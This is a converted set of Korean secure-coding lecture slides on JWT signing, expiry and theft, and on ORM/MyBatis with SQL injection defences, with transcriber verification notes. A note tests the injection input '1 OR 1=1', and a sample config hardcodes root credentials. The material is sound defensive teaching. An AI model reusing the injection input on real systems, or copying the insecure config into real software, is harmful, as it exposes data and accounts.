구현된 JWT 기능 테스트 (3/3)
- Refresh Token 으로 Access Token 및 Refresh Token 회전 시험
Refresh Token의 유효성 확인 후 재발급 처리
웹 브라우저에서 http://localhost:8080/jwt/refresh?refreshToken=리프레시토큰값 입력
토큰이 유효할 경우 JSON 형식으로 새로운 Access Token과 Refresh Token이 반환됨
잘못된 토큰일 경우 HTTP 400 응답으로 에러 메시지가 반환됨
< 토큰이 유효할 경우 >
< 잘못된 토큰일 경우 >

(변환 메모: 아래는 이미지·도표 판독 내용 — 글자 정확도 낮을 수 있음)
**[캡처 1: 토큰이 유효할 경우 — "accessToken", "refreshToken" 키 부분이 빨간 박스로 강조]**
```json
{"accessToken":"eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJ0ZXN0LXVzZXIiLCJpc3MiOiJleGFtcGxlLmNvbSIsImlhdCI6MTc0MTA3NDg1MCwiZXhwIjoxNzQxMDc1NDUwLCJyb2xlIjoidXNlciJ9.yvQSlMq4P2bMAhakpDGe9zmV_M-DgCtsON9HuOp8q5M","refreshToken":"eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJ0ZXN0LXVzZXIiLCJpc3MiOiJleGFtcGxlLmNvbSIsImlhdCI6MTc0MTA3NDg1MCwiZXhwIjoxNzQxMDc2NjUwLCJ0b2tlblR5cGUiOiJyZWZyZXNoIn0.rTH2Y6WdJVvrQrCIfp4cdAqe5O6o_HGj73kkLGF1deU"}
```
- 캡처의 2·4번째 줄 일부(`xNzQxMDc1NDUwLCJ…`, `joxNzQxMDc2NjUwLC…`)가 빨간 박스와 상단 잘림에 가려 있음. 이 부분은 앞뒤 보이는 글자와 클레임 구조로 복원함 (판독 확신 낮음). 서명 부분의 I/l, O/0 글자도 (판독 확신 낮음).

디코딩 결과:
- 새 Access Token 페이로드 `{"sub":"test-user","iss":"example.com","iat":1741074850,"exp":1741075450,"role":"user"}`
- 새 Refresh Token 페이로드 `{"sub":"test-user","iss":"example.com","iat":1741074850,"exp":1741076650,"tokenType":"refresh"}`

**[캡처 2: 잘못된 토큰일 경우 (HTTP 400)]**
```
Invalid Refresh Token: JWT signature does not match locally computed signature. JWT validity cannot be asserted and should not be trusted.
```
(※ 검증: Python으로 확인 — 재인코딩한 값이 캡처에 보이는 글자와 일치. 새 토큰의 iat 1741074850 = 2025-03-04 16:54:10 KST로 19쪽 Refresh Token의 만료 시각(16:59:30) 전에 발급되었고, Access는 +600초, Refresh는 +1800초로 정상. 19쪽 토큰과 서명이 달라 회전(rotation)된 것이 확인됨. 에러 접두어 "Invalid Refresh Token: "은 코드 줄 128과 일치)

---

## [2-SLIDES] 5주차 3차시 p.22 · JWT 인증 및 인가
JWT 인증 및 인가
01 JWT 이해
02 JWT 구현
03 JWT 보안 및 취약점 대응

---

## [2-SLIDES] 5주차 3차시 p.23 · JWT 보안 및 취약점 대응 – 서명과 키 관리
(변환 메모: 슬라이드 원본을 보고 다시 옮긴 내용)

· JWT 서명의 역할
  토큰의 무결성과 진위 보증: 헤더와 페이로드가 변조되지 않았음을 확인
  토큰 위변조 방지를 위한 디지털 서명 적용

· 서명 알고리즘 종류
  · **대칭키 알고리즘:** HS256, HS384, HS512
  · **비대칭키 알고리즘:** RS256, RS384, RS512, ES256 등

· 서명 과정
  헤더와 페이로드를 Base64 URL 인코딩 → 비밀 키(또는 개인키)로 서명 생성 → 최종 JWT 구성

**[표: JWT 구조]** (3열 표, '서명' 열이 빨간 박스로 강조)

헤더:
```json
{
"alg": "HS256",
"typ": "JWT"
}
```
페이로드:
```json
{
"sub": "1234567890",
"name": "Mickey",
"iat": 125334534
}
```
서명 (빨간 박스 강조):
```
HMACSHA256(
base64UrlEncode(header) + "." +
base64UrlEncode(payload),
256-bit-secret
)
```
(※ 검증: Python으로 확인 — 예시 iat 125334534는 1973-12-22로 실제 발급 시각이 아닌 예시용 값. 헤더 {"alg":"HS256","typ":"JWT"}의 Base64URL 인코딩은 `eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9`)

---

## [2-SLIDES] 5주차 3차시 p.24 · JWT 보안 및 취약점 대응 – 서명과 키 관리
JWT 보안 및 취약점 대응 – 서명과 키 관리
- 알고리즘 혼동 공격
공격자가 “none” 알고리즘을 이용하거나 다른 알고리즘으로 위장하여 서명 우회 시도
(대응 방안)
허용 알고리즘을 명시적으로 설정하고, 라이브러리의 알고리즘 검증 강화
- 비밀 키/개인 키 유출
키가 노출되면 토큰 위조가 가능하여 인증 우회 및 권한 탈취 위험 증가
(대응 방안)
강력한 키 생성 및 안전한 저장(HSM, 클라우드 키 관리 서비스)
키 접근 권한 최소화 및 보안 정책 강화
- 키 교체 및 회전 관리 미흡
키 회전 시 기존 토큰 검증 문제, 만료되지 않은 토큰이 악용될 위험
(대응 방안)
정기적인 키 회전 정책과 토큰 재발급, JWKS 엔드포인트 활용

---

## [2-SLIDES] 5주차 3차시 p.25 · JWT 보안 및 취약점 대응 – 유효기간 관리
JWT 보안 및 취약점 대응 – 유효기간 관리
- JWT 유효기간의 역할
만료 시간(exp) 클레임: JWT 내에 포함되어 토큰의 유효 기간을 명시
만료 시간을 통해 탈취된 토큰의 사용 기간을 제한하여 피해 최소화
- 유효기간 설정의 중요성
너무 긴 유효기간은 토큰 탈취 시 장기간 악용 위험 증가
너무 짧은 유효기간은 사용자 경험 저하 및 잦은 재인증 요구
서비스 특성에 맞게 적절한 유효기간 판단 필요
- 유효기간 관리 전략
짧은 만료 시간으로 설정한 Access Token 사용하면서 상대적으로 긴 만료 시간의 Refresh Token을 통한 재발급 전략 사용

---

## [2-SLIDES] 5주차 3차시 p.26 · JWT 보안 및 취약점 대응 – JWT 탈취
JWT 보안 및 취약점 대응 – JWT 탈취
- 주요 JWT 탈취 경로
- XSS 공격
웹 애플리케이션의 입력값 검증 미흡 취약점을 악용하여 악성 스크립트 삽입을 통해 JWT를 탈취
- 불안전한 저장소
로컬 스토리지나 세션 스토리지에 JWT를 저장할 경우, 악성 코드에 의해 유출 위험 존재
- 전송 중 탈취
HTTPS 미적용 또는 취약한 TLS 설정 시 네트워크 스니핑 공격에 노출
- 위험 요소 요약
JWT 탈취 시, 탈취된 토큰으로 정상 사용자의 권한을 도용하여 시스템에 접근할 수 있음
- 대응 방안
- 충실한 XSS 방어
- 안전한 저장소 사용
- 전송 보안 확보

---

## [2-SLIDES] 5주차 3차시 p.27 · 요약 정리
요약 정리
- JWT는 인증과 인가를 위한 강력한 도구지만, 서명 검증, 유효기간 관리, 키 보호가 필수적.
- JWT는 암호화되지 않으므로 민감한 데이터를 직접 포함하면 안 됨.
- Refresh Token을 활용한 인증 유지 전략을 적용하고, 토큰 탈취 방지를 위한 XSS 방어 및 안전한 저
장소 사용이 중요.

---

## [2-SLIDES] 5주차 3차시 p.28 · 참고 문헌
참고 문헌
- [KISA] 소프트웨어 개발 보안 가이드(2021.12.29)
- [KISA] 소프트웨어 보안약점 진단가이드(2021)
- [오픈이지북스] 실무에 바로 적용하는 해킹 방어를 위한 JAVA 시큐어코딩
- [홍릉과학출판사] 소프트웨어 개발 보안 실무 - 시큐어 코딩 원리와 실제
- [secu BOOK] 웹 해킹과 시큐어코딩 탐지/수정 실습가이드
- [에이콘출판사] 보안 위협 모델링 Threat Modeling - 위협 식별과 대응을 위한 소프트웨어 설계
- [책만] 모두를 위한 소프트웨어 보안 설계와 구현 - 취약점 분석부터 위협 모델링과 완화 전략, 보안 패턴,
암호화까지 안전한 소프트웨어의 모든 것
- [위키북스] 웹 애플리케이션 보안 완벽 가이드 - 체계적으로 배우는 안전한 웹 애플리케이션 제작 기법
- [한빛미디어] 웹 애플리케이션 보안 - 정찰, 공격, 방어 세 단계로 배우는 웹 애플리케이션 보안의 모든 것
- [한빛미디어] 웹 해킹 & 보안 완벽 가이드 - 웹 애플리케이션 보안 취약점을 겨냥한 공격과 방어

---

## [2-SLIDES] 5주차 3차시 p.29 · 감사합니다.
감사합니다.

---

## [2-SLIDES] 5주차 3차시 p.30 · 퀴즈
(변환 메모: 슬라이드 원본을 보고 다시 옮긴 내용)

1. JWT의 주요 특징에 해당하지 않는 것은?
   1) 위변조 확인을 위한 서명 포함
   2) 경량
   3) 사용자 정보, 만료시간 등의 정보 자체 포함
   4) 헤더-페이로드-트레일러 로 구성

2. JWT의 단점 중 틀린 것은?
   1) 만료 시간 전 강제 무효화를 위한 관리자 페이지 필요
   2) 토큰 탈취 위험
   3) 정보 노출 문제
   4) 과다한 크기로 전송 오버헤드 발생 가능성

3. JWT 페이로드에 포함시키는 사용자 식별자, 역할, 권한 등의 정보를 일컫는 단어는?
   (                    )

---

## [2-SLIDES] 5주차 3차시 p.31 · 퀴즈 정답
퀴즈 정답
1. JWT의 주요 특징에 해당하지 않는 것은?
4) 헤더-페이로드-트레일러 로 구성
JWT는 헤더-페이로드-서명 으로 구성되어 있는 토큰 형식입니다.
2. JWT의 단점 중 틀린 것은?
1) 만료 시간 전 강제 무효화를 위한 관리자 페이지 필요
JWT는 기본적으로, 만료 기간 전에 강제로 만료할 수 있는 방법이 없습니다.
3. JWT 페이로드에 포함시키는 사용자 식별자, 역할, 권한 등의 정보를 일컫는 단어는?
( 클레임 또는 claim )

# [2-SLIDES] 6주차 1차시 — ORM·MyBatis / SQL 인젝션 / Command 인젝션
키워드: 보안약점/Weakness/CWE/취약점/Vulnerability · SQL Injection/SQL 인젝션/SQL 삽입/에스큐엘 인젝션/에스큐엘/SQLi/CWE-89 · PreparedStatement/프리페어드 스테이트먼트/파라미터 바인딩/바인딩/setString · HTML Encoding/HTML 인코딩/이스케이프/Escape/엔티티/Entity/escapeHtml/textContent · ORM/Object-Relational Mapping/객체 관계 매핑/JPA/Hibernate/하이버네이트 · MyBatis/마이바티스/Mapper/매퍼/#{}/${}/동적 SQL · Dirty Checking/더티 체킹/변경 감지 · Mass Assignment/대량 할당/DTO/isAdmin · Authorization/인가/권한/RBAC/ABAC/PBAC/최소 권한 · Session/세션/JSESSIONID/세션 쿠키/쿠키/HttpOnly/Secure · OAuth2/OAuth 2.0/오아스/권한 위임/Authorization Code/인가 코드/PKCE/state · Filter/필터/Interceptor/인터셉터/Servlet/DispatcherServlet · Threat Modeling/위협 모델링/STRIDE/스트라이드/DREAD/드레드/MS-SDL/MTMT

## [2-SLIDES] 6주차 1차시 p.1 · ORM 프레임워크 이해와 활용
ORM 프레임워크 이해와 활용
01 ORM 개념 및 기본 원리
02 MyBatis 프레임워크 활용
03 ORM 프레임워크 사용 시 보안 이슈

---

## [2-SLIDES] 6주차 1차시 p.2 · 학습 목표
학습 목표
ORM(Object-Relational Mapping) 프레임워크의 개념과 동작 방식을 이해한다.
ORM 사용 시 발생할 수 있는 보안 취약점을 학습하고 보안 위협을 인식한다.
ORM 인젝션을 방어하기 위한 보안 대책을 이해하고 적용할 수 있다.

---

## [2-SLIDES] 6주차 1차시 p.3 · 학습 내용
학습 내용
1. ORM 프레임워크의 개념 및 기본 원리
2. ORM 프레임워크의 장단점
3. MyBatis 프레임워크의 장단점
4. ORM 프레임워크에서 취약점이 발생하는 원인과 대책

---

## [2-SLIDES] 6주차 1차시 p.4 · ORM 프레임워크 이해와 활용
ORM 프레임워크 이해와 활용
01 ORM 개념 및 기본 원리
02 MyBatis 프레임워크 활용
03 ORM 프레임워크 사용 시 보안 이슈

---

## [2-SLIDES] 6주차 1차시 p.5 · ORM(Object-Relational Mapping) 의 정의와 필요성
(변환 메모: 슬라이드 원본을 보고 다시 옮긴 내용)

**ORM의 정의**
- 객체 지향 언어의 객체와 관계형 데이터베이스의 테이블 간 데이터를 자동으로 매핑하는 기술

**ORM의 필요성**
- · 불일치 문제 해결: 객체 모델과 스키마 간 불일치 해소
- · 개발 생산성 향상: SQL 직접 작성 부담 감소, 코드 간결화
- · 유지보수성 및 보안 강화: 데이터베이스 접근 추상화로 보안 취약점(예: SQL Injection) 최소화

[도식: 왼쪽 Java 엔티티 클래스 코드 ⇄(양방향 파란 화살표)⇄ 오른쪽 DB 테이블 — 클래스의 필드가 테이블 컬럼에 매핑됨을 표현]

```java
@Entity
@Table(name = "users")
public class User {
    @Id
    @GeneratedValue(strategy = GenerationType.IDENTITY)
    private Long id;

    @Column(name = "name")
    private String name;

    @Column(name = "email")
    private String email;
}
```

| id | name | email |
|---|---|---|
| guest | 손님 | NULL |
| admin | 관리자 | admin@corp.com |
| operator | 운영자 | op@corp.com |

Table: users

(※ 검증: 원문 내부 모순 — 코드에서 `id`는 `Long` 타입이며 `@GeneratedValue(strategy = GenerationType.IDENTITY)`(DB 자동 증가 숫자)인데, 오른쪽 테이블의 id 값은 `guest`/`admin`/`operator` 같은 문자열임. 매핑 개념 설명용 예시로 이해하면 됨. 또한 17쪽 MyBatis 예시에서는 id를 `int`로 받음)
(※ 검증: Python으로 확인 — `@Table(name = "users")`·`@Column(name = "name")`·`@Column(name = "email")`이 테이블명 users 및 컬럼 name·email과 일치)

---

## [2-SLIDES] 6주차 1차시 p.6 · 전통적인 SQL 쿼리 vs ORM 방식 비교 – 정의와 특징
(변환 메모: 슬라이드 원본을 보고 다시 옮긴 내용)

| 구분 | 전통적인 SQL 쿼리 | ORM (Object-Relational Mapping) |
|---|---|---|
| 정의 | · 개발자가 SQL 문을 작성하여 데이터베이스와 상호작용 / · 쿼리의 구조, 최적화, DBMS 고유 기능을 직접 활용 가능 | · 객체지향 언어의 객체와 관계형 데이터베이스의 테이블을 매핑하는 기술 / · 메서드 호출, 객체 조작을 통해 데이터베이스 작업 수행 |
| 특징 | · 명령형(Imperative) 접근 방식 / · 세밀한 제어와 복잡한 쿼리 작성에 유리 | · 추상화 계층을 제공하여 코드 가독성과 유지보수성 향상 / · DBMS 독립적 구현 가능 |

[삽화 2개 (표 아래)]
- 왼쪽 "Traditional SQL": 곰이 `SELECT * FROM fish WHERE...`라고 적힌 두루마리를 들고 강물에 손을 넣어 직접 물고기를 잡는 그림 — SQL을 직접 작성해 데이터를 가져오는 방식 비유
- 오른쪽 "ORM": 원숭이가 태블릿에 `User.findAll()`(그림 속 글씨는 "User, findAll|"처럼 보임 — 판독 확신 낮음)을 입력하자 로봇 팔이 나무에서 과일을 따 주는 그림 — 메서드 호출만으로 데이터를 가져오는 방식 비유

---

## [2-SLIDES] 6주차 1차시 p.7 · 전통적인 SQL 쿼리 vs ORM 방식 비교 – 장점과 단점
(변환 메모: 슬라이드 원본을 보고 다시 옮긴 내용)

| 구분 | 전통적인 SQL 쿼리 | ORM (Object-Relational Mapping) |
|---|---|---|
| 장점 | · 복잡한 쿼리 작성 및 DBMS 최적화 기능 활용 가능 / · 쿼리 튜닝 및 인덱스 활용에 직접 접근 가능 / · 다양한 SQL 문법과 DB 기능에 바로 접근 | · 객체 중심의 코드 작성으로 개발 속도 향상, 유지보수 용이 / · DBMS 변경 및 플랫폼 독립적인 개발 지원 / · 자동 파라미터 바인딩 등으로 SQL Injection 위험 감소 |
| 단점 | · SQL 코드가 분산되어 있으면 관리 및 변경이 복잡 / · 특정 DBMS에 특화된 문법 사용 시 이식성 저하 / · 파라미터 처리 미흡 시 SQL Injection 위험 | · 복잡한 쿼리나 대량 데이터 처리 시 최적화 한계 존재 / · 복잡한 조인이나 세부 최적화가 어려워 추가 Raw SQL 필요 / · ORM의 내부 동작과 설정을 이해해야 함 |

---

## [2-SLIDES] 6주차 1차시 p.8 · 전통적인 SQL 쿼리 vs ORM 방식 비교
전통적인 SQL 쿼리 vs ORM 방식 비교
전통적 SQL 쿼리 방식이 적합한 경우
- 성능 튜닝이 중요한 경우
- 복잡한 다중 조인 쿼리 작성 시
- 특정 DBMS 고유 기능(예: 저장 프로시저, 윈도우 함수)을 적극 활용할 때
ORM 사용이 적합한 경우
- CRUD 중심의 애플리케이션, 빠른 프로토타이핑 및 유지보수가 중요한 경우
- 데이터베이스 독립성이 필요하거나 객체 지향 패러다임을 선호할 때

(변환 메모: 아래는 이미지·도표 판독 내용 — 글자 정확도 낮을 수 있음)
[오른쪽 삽화 2개]
- 위(전통적 SQL 방식 옆): 상단에 `SELECT * FROM fish WHERE...` 문구, 곰이 강에서 잡은 물고기를 들고 웃는 그림 — 직접 쿼리로 원하는 데이터를 정확히 잡아 옴(성능 튜닝·복잡 쿼리) 비유
- 아래(ORM 방식 옆): 상단에 `User.findAll()` 문구, 원숭이가 태블릿을 조작하자 로봇 팔이 사과를 따 주는 그림 — 메서드 호출만으로 객체를 가져옴(CRUD·빠른 개발) 비유

---

## [2-SLIDES] 6주차 1차시 p.9 · ORM이 제공하는 주요 기능
ORM이 제공하는 주요 기능
매핑 기능
- 객체-테이블 매핑
클래스와 테이블, 필드와 컬럼을 자동으로 매핑하여 SQL 작성 없이 데이터 조작
- 관계 매핑
1:1, 1:N, N:M 관계를 어노테이션 또는 XML 설정을 통해 정의 및 관리
- 자동 스키마 생성
도메인 모델 변경에 따라 DB 스키마를 자동 생성하거나 업데이트 가능
CRUD 작업 지원
- Create, Read, Update, Delete 기능을 객체 조작만으로 처리
- 데이터베이스 직접 접근 없이, 객체 상태 변경에 따른 자동 동기화(DIRTY CHECKING)

---

## [2-SLIDES] 6주차 1차시 p.10 · ORM이 제공하는 주요 기능
ORM이 제공하는 주요 기능
고급 쿼리 기능
- 객체 지향 쿼리 언어 (HQL, JPQL 등)
SQL보다 추상화된 방식으로 데이터 조회 및 조작 가능
- Criteria API
프로그래밍 방식으로 동적 쿼리 작성 지원
- 네이티브 쿼리 지원
필요시 직접 SQL을 실행할 수 있는 기능 제공
Lazy Loading & 캐싱
- 지연 로딩(Lazy Loading)
실제 사용 시점에 연관 데이터를 로드하여 초기 로딩 비용 절감
- 1차/2차 캐시
동일 세션 내 또는 애플리케이션 전역에서 캐시를 활용해 성능 최적화

---

## [2-SLIDES] 6주차 1차시 p.11 · ORM이 제공하는 주요 기능
ORM이 제공하는 주요 기능
트랜잭션 관리
- 자동 트랜잭션 처리
명시적 트랜잭션 없이, ORM 프레임워크가 트랜잭션 경계를 관리
- 동시성 제어 및 낙관적/비관적 Lock 지원
데이터 무결성을 유지하며 여러 사용자의 동시 접근 처리
기타 부가 기능
- 연관 관계 및 Fetch 전략
연관 객체 로딩 전략 설정으로 성능 및 메모리 최적화
- 유연한 설정 및 확장성
XML, 어노테이션, 플러그인 등을 통한 다양한 설정 옵션과 확장성 제공

---

## [2-SLIDES] 6주차 1차시 p.12 · ORM 프레임워크 이해와 활용
ORM 프레임워크 이해와 활용
01 ORM 개념 및 기본 원리
02 MyBatis 프레임워크 활용
03 ORM 프레임워크 사용 시 보안 이슈

---

## [2-SLIDES] 6주차 1차시 p.13 · MyBatis 프레임워크 - 개요
MyBatis 프레임워크 - 개요
MyBatis 프레임워크의 정의
MyBatis는 Java Persistence 프레임워크로, SQL 쿼리와 자바 객체 간의 매핑을 지원
개발자가 직접 SQL을 작성한 후, XML이나 어노테이션을 통해 매핑을 설정하여 DB와 상호작용
특징
- 복잡한 쿼리와 최적화에 유리
- ORM의 추상화 없이 직접 SQL 작성으로 세밀한 제어 가능
- XML, 어노테이션 등 다양한 방식으로 매핑 설정 가능

---

## [2-SLIDES] 6주차 1차시 p.14 · MyBatis 프레임워크 – 주요 기능
MyBatis 프레임워크 – 주요 기능
SQL 매핑 및 실행
- Mapper 파일(XML) 또는 어노테이션 기반으로 SQL 문을 정의
- SQL 문과 자바 객체 간의 자동 매핑 제공
동적 SQL 지원
조건문(if, choose) 및 반복문(foreach)을 사용하여 유연한 쿼리 작성 가능
타입 핸들러 (Type Handler)
자바 객체와 DB 데이터 간 변환을 위한 사용자 정의 타입 핸들러 지원
플러그인 기능
인터셉터를 통해 쿼리 실행 전/후 로직을 확장하거나 커스터마이징 가능

---

## [2-SLIDES] 6주차 1차시 p.15 · MyBatis 프레임워크 – 설정 및 구성
MyBatis 프레임워크 – 설정 및 구성
설정 파일 (mybatis-config.xml)
환경(데이터소스, 트랜잭션 매니저 등) 설정 및 전역 옵션 구성
Mapper 파일 구성
- SQL 문과 매핑 정보를 담은 XML 파일 또는 어노테이션 사용
- 네임스페이스를 통해 Mapper를 구분하고 재사용성 향상
데이터 소스 및 세션 관리
- DB 커넥션 풀과 SqlSessionFactory를 이용해 세션 생성 및 관리
- 스프링과 연동 시, 스프링 부트 자동 설정 및 통합 활용

---

## [2-SLIDES] 6주차 1차시 p.16 · MyBatis 프레임워크 사용 예시 (1/3)
MyBatis 프레임워크 사용 예시 (1/3)
설정 파일 (XML 형식)
- 데이터베이스 연결 정보
- 트랜잭션 관리
- Mapper 등록

(변환 메모: 아래는 이미지·도표 판독 내용 — 글자 정확도 낮을 수 있음)
[코드 이미지: mybatis-config.xml 예시]

```xml
<configuration>
    <environments default="development">
        <environment id="development">
            <transactionManager type="JDBC"/>
            <dataSource type="POOLED">
                <property name="driver" value="com.mysql.cj.jdbc.Driver"/>
                <property name="url" value="jdbc:mysql://localhost:3306/mydb"/>
                <property name="username" value="root"/>
                <property name="password" value="password"/>
            </dataSource>
        </environment>
    </environments>
    <mappers>
        <mapper resource="mapper/UserMapper.xml"/>
    </mappers>
</configuration>
```

- 데이터베이스 연결 정보 → `<dataSource type="POOLED">` 안의 driver/url/username/password property
- 트랜잭션 관리 → `<transactionManager type="JDBC"/>`
- Mapper 등록 → `<mappers>` 안의 `<mapper resource="mapper/UserMapper.xml"/>`

(※ 검증: Python으로 확인 — XML 정상 파싱(well-formed), `environments default="development"`가 `environment id="development"`와 일치, JDBC URL은 호스트 localhost / 포트 3306(MySQL 기본 포트) / DB명 mydb로 분해됨, `com.mysql.cj.jdbc.Driver`는 MySQL Connector/J 8.x 이상의 드라이버 클래스명 — 일치)
(※ 참고: 예시에서 DB 계정이 root, 비밀번호가 평문 "password"로 설정 파일에 하드코딩되어 있음 — 실무에서는 최소 권한 계정·외부화된 비밀 관리가 필요한 부분)

---

## [2-SLIDES] 6주차 1차시 p.17 · MyBatis 프레임워크 사용 예시 (2/3)
MyBatis 프레임워크 사용 예시 (2/3)
XML 기반 매핑
Java 어노테이션 기반

(변환 메모: 아래는 이미지·도표 판독 내용 — 글자 정확도 낮을 수 있음)
[코드 이미지 1 — XML 기반 매핑 (UserMapper.xml)]

```xml
<mapper namespace="com.example.mapper.UserMapper">
    <select id="getUserById" resultType="com.example.model.User">
        SELECT * FROM users WHERE id = #{id}
    </select>

    <insert id="insertUser">
        INSERT INTO users (name, email) VALUES (#{name}, #{email})
    </insert>

    <update id="updateUser">
        UPDATE users SET name = #{name}, email = #{email} WHERE id = #{id}
    </update>

    <delete id="deleteUser">
        DELETE FROM users WHERE id = #{id}
    </delete>
</mapper>
```

[코드 이미지 2 — Java 어노테이션 기반 (UserMapper 인터페이스)]

```java
public interface UserMapper {
    @Select("SELECT * FROM users WHERE id = #{id}")
    User getUserById(@Param("id") int id);

    @Insert("INSERT INTO users(name, email) VALUES(#{name}, #{email})")
    void insertUser(User user);

    @Update("UPDATE users SET name = #{name}, email = #{email} WHERE id = #{id}")
    void updateUser(User user);

    @Delete("DELETE FROM users WHERE id = #{id}")
    void deleteUser(@Param("id") int id);
}
```

- 두 방식 모두 같은 CRUD 4개(getUserById / insertUser / updateUser / deleteUser)를 정의하며, XML의 namespace `com.example.mapper.UserMapper`가 Java 인터페이스 이름과 대응됨
- 모든 값은 `#{...}` 플레이스홀더로 전달 → MyBatis가 PreparedStatement의 `?` 바인딩으로 변환

(※ 검증: Python으로 확인 — XML 정상 파싱, `#{}`를 `?`로 바꾼 최종 SQL: `SELECT * FROM users WHERE id = ?` [id] / `INSERT INTO users (name, email) VALUES (?, ?)` [name, email] / `UPDATE users SET name = ?, email = ? WHERE id = ?` [name, email, id] / `DELETE FROM users WHERE id = ?` [id] — 일치. sqlite3로 입력값 `1 OR 1=1`을 시험하면 바인딩 방식은 0행, 문자열 결합 방식(`... WHERE id = 1 OR 1=1`)은 전체 3행 반환 → `#{}` 바인딩이 SQL 인젝션을 막는 이유 확인)
(※ 검증: 원문 내부 불일치 — 5쪽 User 엔티티의 id는 `Long`인데 여기서는 `int id`로 받음)

---

## [2-SLIDES] 6주차 1차시 p.18 · MyBatis 프레임워크 사용 예시 (3/3)
MyBatis 프레임워크 사용 예시 (3/3)
동적 SQL 지원 (XML 형식)
- <if>
- <where>
- <foreach>

(변환 메모: 아래는 이미지·도표 판독 내용 — 글자 정확도 낮을 수 있음)
[코드 이미지: 동적 SQL 예시 (searchUsers)]

```xml
<select id="searchUsers" resultType="com.example.model.User">
    SELECT * FROM users
    <where>
        <if test="name != null">
            name = #{name}
        </if>
        <if test="email != null">
            AND email = #{email}
        </if>
    </where>
</select>
```

- `<if>`: test 조건(name != null, email != null)이 참일 때만 해당 조건절 포함
- `<where>`: 내부에 조건이 하나라도 있으면 WHERE를 붙이고, 맨 앞의 AND/OR는 자동 제거
- `<foreach>`: 목록에는 있으나 이 코드 예시에는 사용되지 않음 (컬렉션 반복, 예: IN 절 생성용)

(※ 검증: Python으로 `<where>`/`<if>` 동작을 재현해 확인 — 일치:
 둘 다 null → `SELECT * FROM users`
 name만 → `SELECT * FROM users WHERE name = ?`
 email만 → `SELECT * FROM users WHERE email = ?` (앞의 AND 제거)
 둘 다 → `SELECT * FROM users WHERE name = ? AND email = ?`)

---

## [2-SLIDES] 6주차 1차시 p.19 · MyBatis 프레임워크 – 장단점 및 사례
MyBatis 프레임워크 – 장단점 및 사례
장점
- SQL을 직접 작성하므로, 복잡한 쿼리 및 성능 튜닝에 유리
- ORM보다 간단한 설정으로 데이터 매핑을 관리
- DB 작업의 전 과정을 개발자가 직접 관리 가능
단점
- 직접 SQL 작성 시, 비슷한 쿼리의 중복 관리 필요
- ORM처럼 완전한 객체 관계 자동 매핑은 제공하지 않음
- XML/어노테이션 매핑 파일 관리 및 동적 SQL 작성에 대한 학습 필요
사용 사례
- 대규모 데이터 처리, 복잡한 쿼리 최적화가 요구되는 애플리케이션
- 기존 JDBC의 반복 작업을 줄이면서도 세밀한 SQL 제어가 필요한 프로젝트

(변환 메모: 아래는 이미지·도표 판독 내용 — 글자 정확도 낮을 수 있음)
[오른쪽 삽화: 상단 "MyBatis" 글자, 빨간 머리띠를 한 MyBatis 마스코트 새가 책상 위 문서에 도장을 찍는 그림. 주변 종이에 "Mapper Registration OK", "Query Execution Success", "Query Execution Success" 문구 — 매퍼 등록 후 쿼리를 직접 실행·관리하는 MyBatis 방식 비유]

---

## [2-SLIDES] 6주차 1차시 p.20 · ORM 프레임워크 이해와 활용
ORM 프레임워크 이해와 활용
01 ORM 개념 및 기본 원리
02 MyBatis 프레임워크 활용
03 ORM 프레임워크 사용 시 보안 이슈

---

## [2-SLIDES] 6주차 1차시 p.21 · ORM 프레임워크와 보안 개요
ORM 프레임워크와 보안 개요
ORM 프레임워크의 역할
- 객체와 관계형 데이터베이스 간 매핑을 자동화하여 개발 생산성을 높임
- SQL을 직접 작성하지 않고도 CRUD 및 복잡한 쿼리 수행 가능
보안 이슈의 중요성
- ORM 자체가 SQL Injection 등을 기본적으로 방어하지만, 잘못된 사용 시 취약점이 발생할 수 있음
- 매핑, 캐싱, 동적 쿼리 등 여러 요소가 보안에 영향을 미칠 수 있음

---

## [2-SLIDES] 6주차 1차시 p.22 · SQL 인젝션 및 동적 쿼리 취약점
SQL 인젝션 및 동적 쿼리 취약점
SQL 인젝션 주의
기본적인 ORM은 파라미터 바인딩으로 보호되지만, 동적 쿼리를 문자열 결합 방식으로 작성하면 SQL 인젝션 발생할 수 있음
→ Native Query 사용 시 주의 필요
대응 방안
- 항상 안전한 파라미터 바인딩 방식을 사용해야 함
- 동적 쿼리 작성 시, ORM이 제공하는 동적 SQL 태그(예: MyBatis의 if, choose 등) 사용
- Native Query 사용 시 별도 검증 및 파라미터 바인딩 철저

(변환 메모: 아래는 이미지·도표 판독 내용 — 글자 정확도 낮을 수 있음)
[오른쪽 삽화: "SQL Injection"이라고 적힌 주사기가 날아오고, 왼쪽 "ORM" 원숭이는 방패로, 오른쪽 "MyBatis" 새(빨간 머리띠)는 벽돌 벽 뒤에서 막아내는 그림 — ORM/MyBatis의 파라미터 바인딩이 SQL 인젝션 방어 수단임을 비유]

---

## [2-SLIDES] 6주차 1차시 p.23 · 캐싱 및 지연 로딩 관련 보안 이슈
캐싱 및 지연 로딩 관련 보안 이슈
캐싱 취약점
- 2차 캐시나 공유 캐시 설정 시 민감 데이터가 의도치 않게 노출될 가능성
- 캐시 무결성 관리 미흡 시, 캐시 변조 공격(Cache Poisoning) 위험
지연 로딩 및 데이터 노출
- 필요 이상으로 연관된 데이터가 지연 로딩되어, 예상치 못한 데이터 노출 발생 가능
- ORM 매핑 시 민감 정보가 포함된 엔티티를 불필요하게 로드하는 문제
대응 방안
- 캐시 설정 시 민감 데이터 제외 및 접근 제어 강화
- Lazy Loading 설정과 연관 데이터 조회 시 필요한 데이터만 선택적으로 로드하도록 설계

---

## [2-SLIDES] 6주차 1차시 p.24 · 매핑, 설정 및 권한 관리 취약점
매핑, 설정 및 권한 관리 취약점
잘못된 매핑 설정
- 엔티티 매핑 오류로 인한 데이터 누락 또는 과도한 데이터 노출
- 양방향 매핑 및 연관 관계 설정 미흡 시, 무한 루프 또는 불필요한 데이터 로드 발생
Mass Assignment (대량 할당) 취약점
클라이언트 입력 값을 그대로 엔티티에 바인딩할 경우, 원치 않는 필드 변경 가능
대응 방안
- 엔티티 매핑 시, 민감 필드는 명시적으로 제외하거나 읽기 전용으로 설정
- 입력값 검증과 DTO(Data Transfer Object)를 활용하여, 대량 할당 공격 방지

---

## [2-SLIDES] 6주차 1차시 p.25 · 요약 정리
요약 정리
- ORM은 객체와 관계형 데이터베이스 간의 매핑을 자동화하여 개발 생산성을 높임.
- SQL을 직접 작성하지 않아도 CRUD 및 복잡한 쿼리 수행 가능.
